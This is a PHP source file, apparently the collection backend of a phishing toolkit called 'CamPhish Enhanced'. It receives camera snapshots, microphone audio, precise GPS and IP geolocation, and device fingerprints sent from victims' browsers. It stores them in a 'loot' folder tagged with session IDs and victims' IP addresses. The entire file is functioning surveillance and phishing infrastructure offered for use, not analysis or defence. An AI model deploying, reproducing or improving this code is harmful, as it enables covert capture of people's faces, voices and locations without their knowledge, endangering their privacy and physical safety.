<?php
/**
 * CamPhish Enhanced — Unified Data Collection Endpoint
 * Receives camera snapshots, geolocation, audio, and fingerprint data
 * All data tagged with session ID for correlation
 */

// Allow cross-origin requests from tunnel URLs
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: POST, OPTIONS');
header('Access-Control-Allow-Headers: Content-Type');

if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
    http_response_code(200);
    exit;
}

if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    http_response_code(405);
    exit;
}

// ─── Configuration ─────────────────────────────────────────────
$loot_dir = __DIR__ . '/loot';
$camera_dir = $loot_dir . '/camera';
$audio_dir = $loot_dir . '/audio';
$location_file = $loot_dir . '/location_log.json';
$fingerprint_file = $loot_dir . '/fingerprints.json';
$session_log = $loot_dir . '/sessions.json';

// Create directories if they don't exist
foreach ([$loot_dir, $camera_dir, $audio_dir] as $dir) {
    if (!is_dir($dir)) {
        mkdir($dir, 0755, true);
    }
}

// ─── Parse Input ───────────────────────────────────────────────
$content_type = isset($_SERVER['CONTENT_TYPE']) ? $_SERVER['CONTENT_TYPE'] : '';
$data = null;

if (strpos($content_type, 'application/json') !== false) {
    $raw = file_get_contents('php://input');
    $data = json_decode($raw, true);
} else {
    // Form-encoded fallback
    $data = $_POST;
}

if (!$data || !isset($data['type'])) {
    http_response_code(400);
    echo json_encode(['error' => 'missing type']);
    exit;
}

$type = $data['type'];
$session = isset($data['session']) ? $data['session'] : 'unknown';
$timestamp = isset($data['timestamp']) ? $data['timestamp'] : date('c');
$date_tag = date('dMY_His');

// ─── Get Client IP ─────────────────────────────────────────────
$client_ip = '';
if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
    $client_ip = $_SERVER['HTTP_CLIENT_IP'];
} elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
    $client_ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
} else {
    $client_ip = $_SERVER['REMOTE_ADDR'];
}

// ─── Log session activity ──────────────────────────────────────
function append_json_log($file, $entry) {
    $entries = [];
    if (file_exists($file)) {
        $existing = file_get_contents($file);
        $entries = json_decode($existing, true);
        if (!is_array($entries)) $entries = [];
    }
    $entries[] = $entry;
    file_put_contents($file, json_encode($entries, JSON_PRETTY_PRINT));
}

// ─── Handle by type ────────────────────────────────────────────
switch ($type) {

    case 'camera':
        // Save camera snapshot
        $source = isset($data['source']) ? $data['source'] : 'unknown';
        $image_data = isset($data['image']) ? $data['image'] : '';

        if (!empty($image_data)) {
            // Strip data URL prefix
            $filtered = substr($image_data, strpos($image_data, ',') + 1);
            $decoded = base64_decode($filtered);

            // Determine extension from mime
            $ext = 'jpg';
            if (strpos($image_data, 'image/png') !== false) {
                $ext = 'png';
            }

            $filename = "cam_{$source}_{$date_tag}_{$session}.{$ext}";
            $filepath = $camera_dir . '/' . $filename;
            file_put_contents($filepath, $decoded);

            // Signal to bash polling loop
            error_log("Received\r\n", 3, __DIR__ . '/Log.log');

            // Log metadata
            append_json_log($session_log, [
                'type' => 'camera',
                'session' => $session,
                'source' => $source,
                'file' => $filename,
                'size' => strlen($decoded),
                'ip' => $client_ip,
                'timestamp' => $timestamp
            ]);
        }
        break;

    case 'location':
    case 'location_ip':
        // Log geolocation data
        $entry = [
            'session' => $session,
            'type' => $type,
            'latitude' => isset($data['latitude']) ? floatval($data['latitude']) : null,
            'longitude' => isset($data['longitude']) ? floatval($data['longitude']) : null,
            'accuracy' => isset($data['accuracy']) ? floatval($data['accuracy']) : null,
            'altitude' => isset($data['altitude']) ? $data['altitude'] : null,
            'altitude_accuracy' => isset($data['altitude_accuracy']) ? $data['altitude_accuracy'] : null,
            'heading' => isset($data['heading']) ? $data['heading'] : null,
            'speed' => isset($data['speed']) ? $data['speed'] : null,
            'ip' => $client_ip,
            'timestamp' => $timestamp
        ];

        // Add IP-geo specific fields
        if ($type === 'location_ip') {
            $entry['city'] = isset($data['city']) ? $data['city'] : null;
            $entry['region'] = isset($data['region']) ? $data['region'] : null;
            $entry['country'] = isset($data['country']) ? $data['country'] : null;
            $entry['isp'] = isset($data['isp']) ? $data['isp'] : null;
            $entry['source'] = 'ip-api';
        } else {
            $entry['source'] = 'browser';
        }

        append_json_log($location_file, $entry);

        // Also log to sessions
        append_json_log($session_log, [
            'type' => $type,
            'session' => $session,
            'lat' => $entry['latitude'],
            'lon' => $entry['longitude'],
            'ip' => $client_ip,
            'timestamp' => $timestamp
        ]);
        break;

    case 'audio':
        // Save audio chunk
        $audio_data = isset($data['audio']) ? $data['audio'] : '';
        $mime = isset($data['mime']) ? $data['mime'] : 'audio/webm';

        if (!empty($audio_data)) {
            // Strip data URL prefix
            $filtered = substr($audio_data, strpos($audio_data, ',') + 1);
            $decoded = base64_decode($filtered);

            // Extension from mime
            $ext = 'webm';
            if (strpos($mime, 'ogg') !== false) $ext = 'ogg';
            if (strpos($mime, 'mp4') !== false) $ext = 'mp4';

            $filename = "audio_{$date_tag}_{$session}.{$ext}";
            $filepath = $audio_dir . '/' . $filename;
            file_put_contents($filepath, $decoded);

            append_json_log($session_log, [
                'type' => 'audio',
                'session' => $session,
                'file' => $filename,
                'mime' => $mime,
                'size' => strlen($decoded),
                'ip' => $client_ip,
                'timestamp' => $timestamp
            ]);
        }
        break;

    case 'fingerprint':
        // Save device fingerprint
        $fp_entry = $data;
        $fp_entry['ip'] = $client_ip;
        $fp_entry['user_agent_server'] = isset($_SERVER['HTTP_USER_AGENT']) ? $_SERVER['HTTP_USER_AGENT'] : '';

        append_json_log($fingerprint_file, $fp_entry);

        append_json_log($session_log, [
            'type' => 'fingerprint',
            'session' => $session,
            'platform' => isset($data['platform']) ? $data['platform'] : 'unknown',
            'screen' => (isset($data['screen_w']) ? $data['screen_w'] : '?') . 'x' . (isset($data['screen_h']) ? $data['screen_h'] : '?'),
            'ip' => $client_ip,
            'timestamp' => $timestamp
        ]);
        break;

    default:
        http_response_code(400);
        echo json_encode(['error' => 'unknown type: ' . $type]);
        exit;
}

// ─── Response ──────────────────────────────────────────────────
http_response_code(200);
echo json_encode(['status' => 'ok', 'type' => $type]);
